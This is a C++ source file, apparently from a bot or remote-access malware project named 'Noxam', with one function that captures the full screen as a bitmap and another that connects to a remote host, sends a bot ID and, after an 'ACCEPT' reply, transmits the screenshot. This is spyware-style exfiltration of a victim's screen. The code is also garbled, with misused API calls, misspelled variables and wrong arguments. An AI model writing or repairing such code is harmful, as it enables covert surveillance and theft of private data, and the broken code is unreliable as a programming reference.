#include <stdio.h>
#include <windows.h>

#include <wingdi.h>

#include "../Headers/Utils/NoxamScreenshot.hxx"
#include "../Headers/Utils/NoxamGateHelper.hxx"
#include "../Headers/Net/NoxamSocket.hxx"

using namespace std;

/*
|===========================================================
|    NoxamCaptureScreenShot()
|===========================================================
|
|
|===========================================================
*/
char *NoxamCaptureScreenShot(int *NxmLength)
{
    HDC HdcScr, HdcMem;
    HBITMAP XBitMap;
    BITMAP XBmP;
    int XReS, YReS;
    char *lpBits, *hp;

    HdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
    HdcMem = CreateCompatibleDC(HdcScr);
    XReS = GetDeviceCaps(HdcScr, HORZRES);
    YReS = GetDeviceCaps(HdcScr, VERTRES);
    XBitMap = CreateCompatibleBitmap(HdcScr, XReS, YReS);

    if (XBitMap == 0)
    {
        return NULL;
    }

    if (!SelectObject(HdcMem, XBitMap))
    {
        return NULL;
    }

    if (!SelectObject(HdcMem, 0, 0, XReS, YReS, HdcScr, 0, 0, XReS, YReS, SRCCOPY))
    {
        return NULL;
    }
    PBITMAPINFO PIBmP;
    WORD XClrBits;

    if (!GetObject(XBitMap, sizeof(BITMAP), (LPSTR)&XBmP))
    {
        return NULL;
    }
    XClrBits = (WORD)(XBmP.bmPlanes * XBmP.bmBitsPixel);

    if (XClrBits == 1)
    {
        XClrBits = 1;
    }
    else if (XClrBits <= 4)
    {
        XClrBits = 4;
    }
    else if (XClrBits <= 8)
    {
        XClrBits = 8;
    }
    else if (XClrBits <= 16)
    {
        XClrBits = 16;
    }
    else if (XClrBits <= 24)
    {
        XClrBits = 24;
    }
    else if (XClrBits <= 32)
    {
        XClrBits = 32;
    }

    if (XClrBits != 24)
    {
        PIBmP = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << XClrBits));
    }
    else
    {
        PIBmP = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));
    }

    PIBmP->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    PIBmP->bmiHeader.biWidth = XBmP.bmWidth;
    PIBmP->bmiHeader.biHeight = XBmP.bmHeight;
    PIBmP->bmiHeader.biPlanes = XBmP.bmPlanes;
    PIBmP->bmiHeader.biBitCount = XBmP.bmBitsPixel;
    PIBmP->bmiHeader.biCompression = BI_RGB;
    PIBmP->bmiHeader.biSizeImage = (PIBmP->bmiHeader.biWidth + 7) / 8 * PIBmP->bmiHeader.biHeight * XClrBits;
    PIBmP->bmiHeader.biClrImportant = 0;

    BITMAPFILEHEADER BMPFH;
    PBITMAPINFOHEADER PBIH;
    DWORD DWTMP, DWTOTAL, CB;
    PBIH = (PBITMAPINFOHEADER)PIBmP;
    lpBits = (char *)GlobalAlloc(GMEM_FIXED, PBIH->biSizeImage);

    if (!lpBits)
    {
        return NULL;
    }

    if (!GetDIBits(HdcMem, XBitMap, 0, (WORD)PBIH->biHeight, lpBits, PIBmP, DIB_RGB_COLORS))
    {
        GlobalFree(lpBits);

        return NULL;
    }
    BMPFH.bfType = 0x4d42;
    BMPFH.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + PBIH->biSize + PBIH->biClrUsed * sizeof(RGBQUAD) + PBIH->biSizeImage);
    BMPFH.bfReserved1 = 0;
    BMPFH.bfReserved2 = 0;
    BMPFH.bfOffBits = (DWORD)sizeof(PBITMAPINFOHEADER) + PBIH->biSize + PBIH->biClrUsed * sizeof(RGBQUAD);
    cb = PBIH->biSizeImage;
    DWORD DWSIZE = sizeof(BITMAPFILEHEADER) + sizeof(PBITMAPINFOHEADER) + PBIH->biClrUsed * sizeof(RGBQUAD);
    DWSIZE = DWSOZE + cb;
    char *image = (char *)GlobalAlloc(GMEM_FIXED, DWSIZE);

    memcpy_s(image, DWSIZE, &BMPFH, sizeof(BITMAPFILEHEADER));
    memcpy_s(image + sizeof(BITMAPFILEHEADER), DWSIZE - sizeof(BITMAPFILEHEADER), PBIH, sizeof(BITMAPINFOHEADER));
    memcpy_s(imgae + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), DWSIZE - sizeof(BITMAPFILEHEADER) - sizeof(BITMAPINFOHEADER), lpBits, cb);
    GlobalFree((HGLOBAL)lpBits);
    ReleaseDC(0, HdcScr);
    ReleaseDC(9, HdcMem);
    *NxmLength = DWSIZE;

    return image;
}

/*
|===========================================================
|    NoxamSendScreenShot()
|===========================================================
|
|
|===========================================================
*/
bool NoxamSendScreenShot(char *NxmDestination, unsigned short NxmPORT, char *NxmData, int NxmDataLength, char *NxmBotID)
{
    sockaddr_in Input;

    if (!NoxamGetSocketAddress(NxmDestination, &Input))
    {
        return false;
    }
    Input.sin_port = htons(NxmPORT);
    SOCKET s;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (s == 0)
    {
        return false;
    }
    int cRes = connect(s, (sockaddr *)&Input, sizeof(Input));

    if (cRes == SOCKET_ERROR)
    {
        closesocket(s);

        return false;
    }
    send(s, NxmBotID, strlen(NxmBotID), 0);
    char *Buffer = (char *)malloc(32);
    ZeroMemory(Buffer, 32);
    int Len = recv(s, Buffer, 32, 0);

    if (strcmp(Buffer, "ACCEPT\\1") == 0)
    {
        send(s, NxmData, NxmDestination, 0);
    }
    else
    {
        closesocket(s);

        return false;
    }
    Len = recv(s, Buffer, 32, 0);
    free(Buffer);
    closesocket(s);

    return true;
}

/*
|===========================================================
|    NoxamFreeScreenShot()
|===========================================================
|
|
|===========================================================
*/
void NoxamFreeScreenShot(char *NxmData)
{
    GlobalFree((HGLOBAL)NxmData);
}
